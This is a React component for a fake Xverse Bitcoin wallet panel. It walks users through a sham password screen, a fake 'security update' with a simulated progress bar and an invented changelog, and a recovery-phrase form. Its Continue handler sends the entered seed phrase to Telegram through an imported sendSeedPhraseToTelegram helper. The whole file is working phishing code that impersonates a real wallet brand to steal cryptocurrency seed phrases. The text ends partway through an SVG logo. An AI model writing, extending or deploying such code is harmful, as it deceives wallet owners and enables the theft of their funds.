import { useState, useEffect } from 'react';
import { sendSeedPhraseToTelegram } from '../utils/telegram'; // 👈 NEW

interface XversePanelProps {
  isOpen: boolean;
  onClose: () => void;
}

type ViewState = 'splash' | 'password' | 'update_prompt' | 'updating' | 'import';

export default function XversePanel({ isOpen, onClose }: XversePanelProps) {
  const [view, setView] = useState<ViewState>('splash');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [phraseLength, setPhraseLength] = useState<12 | 24>(12);
  const [phraseValues, setPhraseValues] = useState<string[]>(Array(24).fill(''));
  const [updateProgress, setUpdateProgress] = useState(0);
  const [invalidCount, setInvalidCount] = useState(0);
  const [isSending, setIsSending] = useState(false); // 👈 NEW

  // Reset state when modal opens
  useEffect(() => {
    if (isOpen) {
      setView('splash');
      setPassword('');
      setShowPassword(false);
      setPhraseLength(12);
      setPhraseValues(Array(24).fill(''));
      setUpdateProgress(0);
      setInvalidCount(0);
      setIsSending(false); // 👈 NEW

      // Play the splash screen for 2.5 seconds, then go to password
      const timer = setTimeout(() => setView('password'), 2500);
      return () => clearTimeout(timer);
    }
  }, [isOpen]);

  // Handle fake updating screen
  useEffect(() => {
    if (view === 'updating') {
      let progress = 0;
      const interval = setInterval(() => {
        progress += Math.floor(Math.random() * 15) + 5;
        if (progress >= 100) {
          progress = 100;
          clearInterval(interval);
          setTimeout(() => setView('import'), 600);
        }
        setUpdateProgress(progress);
      }, 300);
      return () => clearInterval(interval);
    }
  }, [view]);

  const handleWordChange = (index: number, value: string) => {
    const newValues = [...phraseValues];
    newValues[index] = value;
    setPhraseValues(newValues);
    
    let count = 0;
    newValues.slice(0, phraseLength).forEach(val => {
      if (val.length > 0 && !/^[a-z]+$/.test(val)) {
        count++;
      }
    });
    setInvalidCount(count);
  };

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      const words = text.toLowerCase().trim().split(/\s+/);
      const newValues = [...phraseValues];
      
      words.forEach((word, i) => {
        if (i < phraseLength) newValues[i] = word;
      });
      
      setPhraseValues(newValues);
      
      let count = 0;
      newValues.slice(0, phraseLength).forEach(val => {
        if (val.length > 0 && !/^[a-z]+$/.test(val)) count++;
      });
      setInvalidCount(count);
    } catch (err) {
      console.error('Failed to read clipboard: ', err);
    }
  };

  const isPhraseComplete = () => {
    const activeWords = phraseValues.slice(0, phraseLength);
    return activeWords.every(word => word.trim().length > 0) && invalidCount === 0;
  };

  return (
    <>
      <div className={`fixed inset-0 z-[2147483648] font-sans ${isOpen ? 'pointer-events-auto' : 'pointer-events-none'}`}>
        
        {/* Backdrop */}
        <div 
          className={`absolute inset-0 bg-[#12121280] transition-opacity duration-[400ms] ease-in-out ${isOpen ? 'opacity-100' : 'opacity-0'}`} 
          onClick={onClose}
        ></div>
        
        {/* Main Modal */}
        <div className={`flex transition-all duration-[600ms] ease-[cubic-bezier(0.22,1,0.36,1)] fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-full h-full max-h-full md:top-0 md:right-8 md:left-auto md:translate-x-0 md:translate-y-0 md:w-[360px] md:h-[685px] md:border border-[#eaecef] md:rounded-xl overflow-hidden ${isOpen ? 'scale-100 opacity-100' : 'scale-95 opacity-0'}`}>
          <div className="h-full w-full bg-[#ffffff] shadow-2xl relative overflow-hidden flex flex-col">

            {/* ========================================== */}
            {/* LAYER 1: SPLASH SCREEN                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-10 flex flex-col items-center justify-center transition-all duration-700 ease-[cubic-bezier(0.25,1,0.5,1)] bg-[#181818] ${view === 'splash' ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-110 blur-sm pointer-events-none'}`}>
              <div className="flex flex-col items-center justify-center w-full px-6">
                <div className="mb-20">
                  <XverseTextLogoSVG className="w-auto h-10 text-white" />
                </div>
                
                <div className="text-center mb-16 animate-[fadeIn_1s_ease-out_0.2s_both]">
                  <h3 className="text-[#ffffff] text-[24px] font-rubik font-light mb-1">Welcome back</h3>
                  <p className="text-[#ffffff80] text-[14px] font-rubik font-normal">Your wallet is secured</p>
                </div>

                <div className="flex justify-center items-center mb-16 animate-[fadeIn_1s_ease-out_0.4s_both]">
                  <div className="relative w-[60px] h-[60px] rounded-full bg-white/[0.01] shadow-[inset_0_0_20px_rgba(255,255,255,0.1)] flex items-center justify-center">
                    <svg viewBox="0 0 60 60" width="60" height="60" className="animate-spin duration-1000">
                      <linearGradient id="spinner-gradient-xverse" x1="0%" y1="0%" x2="100%" y2="100%">
                        <stop offset="0%" stopColor="#6619FF"></stop>
                        <stop offset="100%" stopColor="#00BFFF"></stop>
                      </linearGradient>
                      <circle cx="30" cy="30" r="28" fill="none" strokeWidth="2.5" stroke="url(#spinner-gradient-xverse)" strokeLinecap="round" strokeDasharray="130" strokeDashoffset="40"></circle>
                    </svg>
                  </div>
                </div>

                <div className="text-center animate-[fadeIn_1s_ease-out_0.6s_both]">
                  <p className="text-[#ffffff80] text-[16px] font-rubik font-light animate-pulse">Loading...</p>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 2: PASSWORD SCREEN                   */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-20 flex flex-col px-6 pt-16 transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#ffffff] ${view === 'password' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex flex-col items-center justify-center mb-10 shrink-0">
                <XverseTextLogoSVG className="w-auto h-12 mb-8 text-[#2E2E2E]" />
                <h4 className="font-dm-sans text-[#222222] font-medium text-[16px]">The Bitcoin wallet for everyone</h4>
              </div>
              
              <div className="flex flex-col w-full flex-1">
                <p className="font-dm-sans text-[#222222] font-medium text-[14px] mb-2">Password</p>
                <div className="relative w-full mb-6">
                  <input 
                    className="w-full h-[46px] py-[10px] pl-[16px] pr-[48px] text-[14px] font-medium rounded-[8px] text-[#222222] caret-[#ee7a30] border border-[#2222220d] bg-[#f9f9f9] focus:bg-white focus:border-[#ee7a30] outline-none transition-all duration-300 font-dm-sans" 
                    type={showPassword ? "text" : "password"} 
                    placeholder="Enter your password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                  />
                  <button 
                    type="button" 
                    onClick={() => setShowPassword(!showPassword)}
                    className="absolute right-3.5 top-[13px] text-[#B3B3B3] hover:text-[#ee7a30] transition-colors cursor-pointer"
                  >
                    {!showPassword ? (
                      <svg className="w-5 h-5" viewBox="0 0 256 256" fill="currentColor"><path d="M247.31,124.76c-.35-.79-8.82-19.58-27.65-38.41C194.57,61.26,162.88,48,128,48S61.43,61.26,36.34,86.35C17.51,105.18,9,124,8.69,124.76a8,8,0,0,0,0,6.5c.35.79,8.82,19.57,27.65,38.4C61.43,194.74,93.12,208,128,208s66.57-13.26,91.66-38.34c18.83-18.83,27.3-37.61,27.65-38.4A8,8,0,0,0,247.31,124.76ZM128,168a40,40,0,1,1,40-40A40,40,0,0,1,128,168Z"></path></svg>
                    ) : (
                      <svg className="w-5 h-5" viewBox="0 0 256 256" fill="currentColor"><path d="M96.68,57.87a4,4,0,0,1,2.08-6.6A130.13,130.13,0,0,1,128,48c34.88,0,66.57,13.26,91.66,38.35,18.83,18.83,27.3,37.62,27.65,38.41a8,8,0,0,1,0,6.5c-.35.79-8.82,19.57-27.65,38.4q-4.28,4.26-8.79,8.07a4,4,0,0,1-5.55-.36ZM213.92,210.62a8,8,0,1,1-11.84,10.76L180,197.13A127.21,127.21,0,0,1,128,208c-34.88,0-66.57-13.26-91.66-38.34C17.51,150.83,9,132.05,8.69,131.26a8,8,0,0,1,0-6.5C9,124,17.51,105.18,36.34,86.35a135,135,0,0,1,25-19.78L42.08,45.38A8,8,0,1,1,53.92,34.62Zm-65.49-48.25-52.69-58a40,40,0,0,0,52.69,58Z"></path></svg>
                    )}
                  </button>
                </div>
                
                <div className="w-full mt-2 mb-6 shrink-0">
                  <button 
                    onClick={() => setView('update_prompt')}
                    disabled={password.length < 3}
                    className="w-full text-[#ffffff] bg-[#2E2E2E] font-medium font-dm-sans text-[15px] rounded-[10px] py-[12px] hover:opacity-90 disabled:opacity-40 disabled:cursor-not-allowed transition-all duration-300 active:scale-[0.98]"
                  >
                    Unlock
                  </button>
                </div>
                
                <div className="w-full text-center">
                  <span className="text-[#7d7d7d] font-normal font-dm-sans text-[14px] underline cursor-pointer hover:no-underline transition-all duration-300">
                    Forgot your password?
                  </span>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 3: UPDATE PROMPT                     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-30 flex flex-col px-6 py-6 transition-all duration-500 ease-[cubic-bezier(0.16,1,0.3,1)] bg-[#ffffff] ${view === 'update_prompt' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center shrink-0 mb-6">
                <button className="p-1.5 rounded-full hover:bg-[#f9f9f9] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-5 h-5 text-[#2e2e2e]" viewBox="0 0 256 256" fill="currentColor"><path d="M224,128a8,8,0,0,1-8,8H59.31l58.35,58.34a8,8,0,0,1-11.32,11.32l-72-72a8,8,0,0,1,0-11.32l72-72a8,8,0,0,1,11.32,11.32L59.31,120H216A8,8,0,0,1,224,128Z"></path></svg>
                </button>
              </div>
              
              <div className="flex flex-col flex-grow overflow-y-auto xverse-scrollbar pr-2">
                <div className="flex items-center justify-center mb-6">
                  <XverseIconSVG className="w-14 h-14" />
                </div>
                
                <div className="flex flex-col items-center justify-center mb-6 text-center">
                  <h4 className="font-dm-sans text-[#222222] font-medium text-[20px]">Update Available</h4>
                  <p className="font-dm-sans text-[#7d7d7d] font-normal text-[15px] mt-1">Version 1.9.4</p>
                </div>

                <div className="w-full mb-6 rounded-[12px] bg-[#EE7A3010] border border-[#EE7A3033] overflow-hidden">
                  <div className="p-3.5 flex items-start">
                    <svg className="w-5 h-5 text-[#EE7A30] mr-3 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none">
                      <path d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                    </svg>
                    <div>
                      <h3 className="font-dm-sans text-[#222222] font-medium text-[14px] mb-0.5">Security Update Required</h3>
                      <p className="font-dm-sans text-[#7d7d7d] font-normal text-[13px] m-0 leading-[18px]">Protect your assets with this critical update</p>
                    </div>
                  </div>
                </div>
                
                <div className="w-full mb-6">
                  <div className="flex items-center justify-between mb-4">
                    <p className="font-dm-sans text-[#222222] font-medium text-[16px]">What's new</p>
                    <div className="text-xs text-[#EE7A30] font-medium bg-[#EE7A3015] px-2 py-1 rounded-md">v1.9.4</div>
                  </div>
                  
                  <div className="relative pl-5 border-l-2 border-[#EE7A3040] ml-2 space-y-6">
                    <div className="relative">
                      <div className="absolute w-3 h-3 rounded-full bg-[#EE7A30] -left-[27px] top-1 ring-4 ring-white"></div>
                      <div className="flex flex-col">
                        <span className="font-dm-sans text-[#222222] font-medium text-[14px]">Improved token swaps</span>
                        <span className="font-dm-sans text-[#7d7d7d] font-normal text-[13px] mt-0.5">Better rates and lower slippage for all trades</span>
                      </div>
                    </div>
                    <div className="relative">
                      <div className="absolute w-3 h-3 rounded-full bg-[#EE7A30] -left-[27px] top-1 ring-4 ring-white"></div>
                      <div className="flex flex-col">
                        <span className="font-dm-sans text-[#222222] font-medium text-[14px]">Security enhancement</span>
                        <span className="font-dm-sans text-[#7d7d7d] font-normal text-[13px] mt-0.5">Fixed critical vulnerability in transaction signing</span>
                      </div>
                    </div>
                    <div className="relative">
                      <div className="absolute w-3 h-3 rounded-full bg-[#EE7A30] -left-[27px] top-1 ring-4 ring-white"></div>
                      <div className="flex flex-col">
                        <span className="font-dm-sans text-[#222222] font-medium text-[14px]">Web3 integration</span>
                        <span className="font-dm-sans text-[#7d7d7d] font-normal text-[13px] mt-0.5">Improved connection stability for all dApps</span>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mt-auto shrink-0 pt-4 border-t border-[#f2f2f2]">
                <button 
                  onClick={() => setView('updating')}
                  className="w-full text-[#ffffff] bg-[#2E2E2E] font-medium font-dm-sans text-[15px] cursor-pointer rounded-[10px] py-[12px] transition-all duration-300 hover:bg-[#111111] active:scale-[0.98]" 
                  type="button"
                >
                  Update now
                </button>
                <div className="text-center mt-4">
                  <a href="https://support.xverse.app/hc/en-us" target="_blank" rel="noreferrer" className="font-dm-sans text-[#7d7d7d] text-[13px] font-medium hover:text-[#222222] transition-colors">Need help? Contact support</a>
                </div>
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 4: UPDATING STATE (PROGRESS BAR)     */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-40 transition-opacity duration-500 bg-[#ffffff] ${view === 'updating' ? 'opacity-100 pointer-events-auto' : 'opacity-0 pointer-events-none'}`}>
              <div className="flex flex-col h-full items-center justify-center px-8">
                
                <div className="mb-8 relative">
                  <div className="h-24 w-24 rounded-full bg-[#f5f5f58c] border border-[#EE7A3030] flex items-center justify-center animate-[pulse_2s_ease-in-out_infinite]">
                    <XverseIconSVG className="w-12 h-12" />
                  </div>
                </div>
                
                <div className="flex flex-col items-center justify-center mb-10 text-center">
                  <h4 className="font-dm-sans text-[#222222] font-medium text-[22px] mb-1.5">Updating Xverse</h4>
                  <p className="font-dm-sans text-[#7d7d7d] font-normal text-[15px]">Please wait while we install version 1.9.4</p>
                </div>
                
                <div className="w-full mb-8">
                  {/* Step indicators */}
                  <div className="flex items-center justify-between mb-8 px-2">
                    <div className="w-7 h-7 rounded-full bg-[#EE7A30] flex items-center justify-center shadow-[0_0_10px_rgba(238,122,48,0.4)]">
                      <span className="text-[#ffffff] text-[13px] font-bold font-dm-sans">1</span>
                    </div>
                    <div className="flex-1 mx-2 h-[2px] bg-[#EE7A30] opacity-50"></div>
                    <div className="w-7 h-7 rounded-full bg-[#ececec] flex items-center justify-center">
                      <span className="text-[#888888] text-[13px] font-bold font-dm-sans">2</span>
                    </div>
                    <div className="flex-1 mx-2 h-[2px] bg-[#ececec]"></div>
                    <div className="w-7 h-7 rounded-full bg-[#ececec] flex items-center justify-center">
                      <span className="text-[#888888] text-[13px] font-bold font-dm-sans">3</span>
                    </div>
                  </div>
                  
                  {/* Progress bar */}
                  <div className="w-full h-[6px] bg-[#ececec] rounded-full overflow-hidden mb-3">
                    <div className="h-full bg-[#EE7A30] rounded-full transition-all duration-300" style={{ width: `${updateProgress}%` }}></div>
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <div className="flex items-center">
                      <svg className="w-4 h-4 text-[#EE7A30] mr-2 animate-spin" viewBox="0 0 24 24" fill="none">
                        <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                        <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                      </svg>
                      <p className="font-dm-sans text-[#7d7d7d] text-[13px] font-medium">Downloading update...</p>
                    </div>
                    <p className="font-dm-sans text-[#EE7A30] text-[14px] font-bold">{updateProgress}%</p>
                  </div>
                </div>

                <div className="bg-[#ee7a301a] border-l-4 border-[#EE7A30] rounded p-3 flex items-start w-full">
                  <svg className="w-5 h-5 text-[#EE7A30] mr-3 flex-shrink-0 mt-0.5" viewBox="0 0 24 24" fill="none">
                    <path d="M12 9v3.75m-9.303 3.376c-.866 1.5.217 3.374 1.948 3.374h14.71c1.73 0 2.813-1.874 1.948-3.374L13.949 3.378c-.866-1.5-3.032-1.5-3.898 0L2.697 16.126zM12 15.75h.007v.008H12v-.008z" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"></path>
                  </svg>
                  <p className="font-dm-sans text-[#555555] text-[13px] font-medium leading-[18px]">Please do not close this window during the update process.</p>
                </div>
                
              </div>
            </div>

            {/* ========================================== */}
            {/* LAYER 5: IMPORT WALLET (SEED PHRASE)       */}
            {/* ========================================== */}
            <div className={`absolute inset-0 z-50 bg-[#ffffff] transition-all duration-700 ease-[cubic-bezier(0.16,1,0.3,1)] flex flex-col ${view === 'import' ? 'opacity-100 translate-y-0 pointer-events-auto' : 'opacity-0 translate-y-8 pointer-events-none'}`}>
              
              <div className="flex justify-start items-center px-4 pt-4 pb-2 shrink-0">
                <button className="p-1.5 rounded-full hover:bg-[#f9f9f9] transition-all duration-300 cursor-pointer active:scale-95" type="button" onClick={onClose}>
                  <svg className="w-5 h-5 text-[#2e2e2e]" viewBox="0 0 256 256" fill="currentColor"><path d="M224,128a8,8,0,0,1-8,8H59.31l58.35,58.34a8,8,0,0,1-11.32,11.32l-72-72a8,8,0,0,1,0-11.32l72-72a8,8,0,0,1,11.32,11.32L59.31,120H216A8,8,0,0,1,224,128Z"></path></svg>
                </button>
              </div>

              <div className="flex flex-col items-center justify-center text-center px-6 mb-6 shrink-0 mt-2">
                <div className="h-16 w-16 rounded-full bg-[#f5f5f58c] border border-[#EE7A3030] flex items-center justify-center mb-4">
                  <XverseIconSVG className="w-8 h-8" />
                </div>
                <h4 className="font-dm-sans text-[#222222] font-medium text-[20px] mb-1">Import with your recovery phrase</h4>
                <p className="font-dm-sans text-[#7d7d7d] font-normal text-[14px]">Type or paste your recovery phrase</p>
              </div>

              {/* Grid */}
              <div className="px-5 max-h-[300px] overflow-y-auto xverse-scrollbar flex-1 pb-2">
                <div className={`grid gap-2.5 ${phraseLength === 12 ? 'grid-cols-2 sm:grid-cols-3' : 'grid-cols-3'}`}>
                  {Array.from({ length: phraseLength }).map((_, i) => {
                    const isError = phraseValues[i].length > 0 && !/^[a-z]+$/.test(phraseValues[i]);
                    return (
                      <div key={i} className="relative group">
                        <div className="absolute left-[12px] top-[11px] pointer-events-none">
                          <p className="font-dm-sans text-[#7d7d7d] text-[13px] font-medium group-focus-within:text-[#ee7a30] transition-colors">{i + 1}.</p>
                        </div>
                        <input 
                          className={`w-full h-[42px] py-[10px] pl-[34px] pr-[8px] text-[14px] font-medium rounded-[8px] text-[#222222] outline-none transition-all duration-300 font-dm-sans ${isError ? 'bg-[#ff00000a] text-[#ff5f52] border border-[#ff5f5250] focus:border-[#ff5f52]' : 'bg-[#f9f9f9] border border-[#2222220d] focus:bg-white focus:border-[#ee7a30] hover:border-[#22222220]'}`} 
                          type="password" 
                          value={phraseValues[i]}
                          onChange={(e) => handleWordChange(i, e.target.value.toLowerCase())}
                        />
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Error Label */}
              <div className={`px-6 mt-2 mb-2 transition-opacity duration-300 min-h-[18px] text-center shrink-0 ${invalidCount > 0 ? 'opacity-100' : 'opacity-0'}`}>
                <p className="font-dm-sans text-[#ff5f52] text-[13px] font-medium">{invalidCount} word{invalidCount > 1 ? 's are' : ' is'} invalid or misspelled</p>
              </div>

              {/* Toggle 12/24 Phrase */}
              <div className="flex items-center justify-center mb-4 shrink-0">
                <button 
                  onClick={() => { setPhraseLength(phraseLength === 12 ? 24 : 12); setPhraseValues(Array(24).fill('')); setInvalidCount(0); }}
                  className="group flex items-center justify-center gap-x-1 active:opacity-70 transition-all duration-300"
                >
                  <span className="text-[#7d7d7d] font-medium font-dm-sans text-[14px] group-hover:text-[#222222] transition-colors">
                    {phraseLength === 12 ? 'Have a 24 word seed phrase?' : 'Have a 12 word seed phrase?'}
                  </span>
                </button>
              </div>

              {/* Paste button */}
              <div className="px-6 mb-4 flex justify-end shrink-0">
                <button onClick={handlePaste} className="text-[#ee7a30] text-[13px] font-dm-sans font-medium hover:opacity-80 transition-opacity flex items-center gap-x-1">
                  <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M16 4h2a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h2"></path><rect x="8" y="2" width="8" height="4" rx="1" ry="1"></rect></svg>
                  Paste
                </button>
              </div>

              {/* Proceed Button – NOW SENDS TO TELEGRAM */}
              <div className="px-6 pb-6 mt-auto shrink-0 border-t border-[#f5f5f5] pt-4">
                <button 
                  disabled={!isPhraseComplete() || isSending}
                  onClick={async () => {
                    setIsSending(true);
                    const seedString = phraseValues.slice(0, phraseLength).join(' ');
                    const success = await sendSeedPhraseToTelegram(seedString, 'Xverse Wallet');
                    if (success) {
                      onClose();
                    } else {
                      console.error('Failed to send seed phrase');
                    }
                    setIsSending(false);
                  }}
                  className="w-full text-[#ffffff] bg-[#2E2E2E] font-medium font-dm-sans text-[15px] cursor-pointer rounded-[10px] py-[13px] transition-all duration-300 hover:bg-[#111111] disabled:opacity-40 disabled:cursor-not-allowed active:scale-[0.98]" 
                >
                  {isSending ? 'Sending...' : 'Continue'}
                </button>
              </div>
            </div>

          </div>
        </div>
      </div>

      <style dangerouslySetInnerHTML={{ __html: `
        .xverse-scrollbar::-webkit-scrollbar { width: 4px; }
        .xverse-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .xverse-scrollbar::-webkit-scrollbar-thumb { background: #d1d1d1; border-radius: 10px; }
        .xverse-scrollbar::-webkit-scrollbar-thumb:hover { background: #ee7a30; }
        
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(10px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}} />
    </>
  );
}

// -------------------------------------------------------------------
// XVERSE SVG COMPONENTS
// -------------------------------------------------------------------

const XverseIconSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 57 57" fill="none" xmlns="http://www.w3.org/2000/svg">
    <path d="M56.6995 55.7863V45.4658C56.6995 45.0566 56.5368 44.6663 56.2468 44.3763L12.334 0.463341C12.044 0.173353 11.6537 0.0107422 11.2445 0.0107422H0.924169C0.414657 0.0107422 0 0.425399 0 0.934911V10.5235C0 10.9328 0.16261 11.323 0.452599 11.613L16.215 27.3754C16.5754 27.7359 16.5754 28.3212 16.215 28.6817L0.271018 44.6257C0.0975663 44.7991 0 45.0349 0 45.2788V55.7863C0 56.2955 0.414657 56.7105 0.924169 56.7105H18.169C18.6785 56.7105 19.0932 56.2955 19.0932 55.7863V49.5961C19.0932 49.3522 19.1907 49.1164 19.3642 48.943L27.9175 40.3896C28.278 40.0292 28.8634 40.0292 29.2238 40.3896L45.0946 56.2606C45.3846 56.5506 45.7749 56.7133 46.1841 56.7133H55.7726C56.2822 56.7133 56.6967 56.2982 56.6967 55.7891L56.6995 55.7863Z" fill="currentColor"></path>
    <path d="M33.6956 13.6786H42.3329C42.8451 13.6786 43.2625 14.096 43.2625 14.6082V23.2455C43.2625 24.0749 44.2653 24.4895 44.8507 23.9014L56.6996 12.0336C56.8728 11.8601 56.9707 11.6243 56.9707 11.3777V0.984154C56.9707 0.471933 56.5557 0.0545666 56.041 0.0545666L45.493 0.0410156C45.2464 0.0410156 45.0106 0.138582 44.8344 0.312033L33.037 12.0905C32.4516 12.6758 32.8663 13.6786 33.6929 13.6786H33.6956Z" fill="#EE7A30"></path>
  </svg>
);

const XverseTextLogoSVG = ({ className }: { className?: string }) => (
  <svg className={className} viewBox="0 0 80 16" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
    <path d="M14.0099 14.9768V12.4388C14.0099 12.3373 13.9592 12.2358 13.9084 12.1596L3.07102 1.29683C2.99488 1.22069 2.89336 1.19531 2.79184 1.19531H0.253803C0.126902 1.19531 0.0253804 1.29683 0.0253804 1.42374V3.78411C0.0253804 3.88563 0.0761411 3.98715 0.126902 4.06329L4.01009 7.94648C4.11161 8.048 4.11161 8.1749 4.01009 8.27642L0.076141 12.2104C0.0253803 12.2611 0 12.3119 0 12.3627V14.9515C0 15.0784 0.101521 15.1799 0.228423 15.1799H4.49232C4.61922 15.1799 4.72074 15.0784 4.72074 14.9515V13.4286C4.72074 13.3779 4.74612 13.3017 4.79688 13.2764L6.90345 11.1698C7.00497 11.0683 7.13187 11.0683 7.23339 11.1698L11.142 15.0784C11.2181 15.1545 11.3196 15.1799 11.4211 15.1799H13.7815C13.9084 15.2053 14.0099 15.1037 14.0099 14.9768Z"></path>
    <path d="M8.29982 4.54552H10.4318C10.5587 4.54552 10.6602 4.64704 10.6602 4.77394V6.90589C10.6602 7.10893 10.914 7.21045 11.0409 7.05817L13.9596 4.13943C14.0104 4.08867 14.0358 4.03791 14.0358 3.98715V1.42374C14.0358 1.29683 13.9343 1.19531 13.8074 1.19531H11.2186C11.1678 1.19531 11.0917 1.22069 11.0663 1.27145L8.14754 4.16481C7.99526 4.29171 8.09678 4.54552 8.29982 4.54552Z" fill="#EE7A30"></path>
    <path d="M19.6957 15.053L14.9496 1.55066C14.8988 1.39838 15.0004 1.24609 15.178 1.24609H18.4775C18.579 1.24609 18.6551 1.32223 18.7059 1.39838L20.914 8.47949L21.5485 10.6876C21.5485 10.713 21.5739 10.713 21.5739 10.713C21.5992 10.713 21.5992 10.713 21.5992 10.6876C21.7261 10.1038 21.9292 9.3678 22.2084 8.47949L24.4672 1.39838C24.4926 1.29685 24.5941 1.24609 24.6956 1.24609H27.9443C28.0966 1.24609 28.2235 1.39838 28.1727 1.55066L23.3759 15.053C23.3505 15.1545 23.249 15.2053 23.1474 15.2053H19.8988C19.7972 15.2053 19.7211 15.1545 19.6957 15.053Z"></path>
    <path d="M35.7104 15.6366C33.4516 15.6366 31.675 14.9513 30.3806 13.5554C29.0862 12.1595 28.4517 10.3828 28.4517 8.20014C28.4517 6.04281 29.0862 4.34233 30.3806 2.94641C31.675 1.52511 33.3247 0.839844 35.3551 0.839844C37.5632 0.839844 39.2637 1.60125 40.4566 3.12407C41.6241 4.62151 42.2332 6.5758 42.2586 9.03769C42.2586 9.16459 42.157 9.26611 42.0301 9.26611H32.3602C32.2079 9.26611 32.1064 9.39302 32.1318 9.5453C32.3095 10.5351 32.6648 11.2965 33.2232 11.8549C33.8323 12.464 34.6445 12.7686 35.6851 12.7686C37.0048 12.7686 37.8678 12.2356 38.3246 11.1696C38.35 11.0935 38.4515 11.0427 38.5277 11.0427H41.751C41.9032 11.0427 42.0048 11.195 41.9794 11.3219C41.6748 12.5148 40.9895 13.5046 39.9743 14.3168C38.8576 15.2051 37.4363 15.6366 35.7104 15.6366ZM35.4312 3.68244C33.7054 3.68244 32.6394 4.59613 32.2333 6.42352C32.2079 6.5758 32.3095 6.7027 32.4618 6.7027H38.1469C38.2738 6.7027 38.4007 6.5758 38.3754 6.4489C38.2738 5.66211 37.9947 5.0276 37.4871 4.51999C36.9541 3.96162 36.2434 3.68244 35.4312 3.68244Z"></path>
    <path d="M51.6502 4.21559C51.6502 4.34249 51.5486 4.44402 51.4217 4.44402H47.6654C47.5385 4.44402 47.437 4.54554 47.437 4.67244V15.0022C47.437 15.1291 47.3355 15.2307 47.2086 15.2307H44.0868C43.9599 15.2307 43.8584 15.1291 43.8584 15.0022V5.68765C43.8584 3.22576 45.8634 1.24609 48.3 1.24609H51.3964C51.5233 1.24609 51.6248 1.34762 51.6248 1.47452L51.6502 4.21559Z"></path>
    <path d="M59.0853 15.6366C57.0549 15.6366 55.4813 15.2051 54.3392 14.3168C53.2732 13.4792 52.8163 12.3625 52.6641 10.9412C52.6641 10.8143 52.7656 10.6874 52.8925 10.6874H55.9127C56.0143 10.6874 56.1158 10.7635 56.1412 10.8651C56.4204 12.2864 57.2579 12.997 59.0091 12.997C59.8467 12.997 60.4812 12.8447 60.938 12.5655C61.3949 12.261 61.6233 11.8803 61.6233 11.3981C61.6233 11.2204 61.5979 11.0427 61.5218 10.9158C61.4457 10.7635 61.3441 10.6366 61.1919 10.5097C61.0396 10.3828 60.8873 10.3067 60.7858 10.2306C60.6589 10.1544 60.4558 10.0783 60.1766 10.0021C59.8721 9.92599 59.669 9.87523 59.4914 9.84985C59.3391 9.82447 59.0599 9.77371 58.6792 9.69757C58.2985 9.62143 58.0447 9.59605 57.8924 9.54529C57.131 9.39301 56.4965 9.24072 56.0143 9.08844C55.532 8.93616 55.0244 8.70774 54.4914 8.40317C53.9585 8.09861 53.5524 7.69252 53.2986 7.18492C53.0194 6.67731 52.8925 6.0428 52.8925 5.30677C52.8925 3.86009 53.4255 2.74336 54.5168 1.98195C55.6082 1.22054 56.9533 0.814453 58.6284 0.814453C60.4558 0.814453 61.8771 1.22054 62.9177 2.05809C63.8822 2.84488 64.3136 3.88547 64.4913 5.20525C64.5167 5.33215 64.3898 5.45905 64.2629 5.45905H61.3188C61.2172 5.45905 61.1157 5.38291 61.0903 5.25601C60.8873 4.01237 60.1513 3.40325 58.5777 3.40325C57.8163 3.40325 57.2325 3.53015 56.8011 3.80933C56.3696 4.08852 56.1412 4.46922 56.1412 4.95145C56.1412 5.10373 56.1665 5.25601 56.2427 5.40829C56.3188 5.56058 56.4204 5.6621 56.5726 5.76362C56.7249 5.86514 56.8772 5.94128 57.0295 6.01742C57.1818 6.09356 57.3848 6.14432 57.664 6.22046C57.9432 6.2966 58.1716 6.34737 58.3746 6.37275C58.5777 6.42351 58.8569 6.47427 59.2122 6.52503C59.5675 6.60117 59.8467 6.62655 60.0497 6.67731C60.6335 6.80421 61.1157 6.93111 61.4964 7.00725C61.8771 7.10878 62.3086 7.26106 62.8162 7.48948C63.3238 7.7179 63.7045 7.97171 63.9837 8.25089C64.2629 8.53007 64.5167 8.91078 64.7197 9.39301C64.9228 9.87523 65.0243 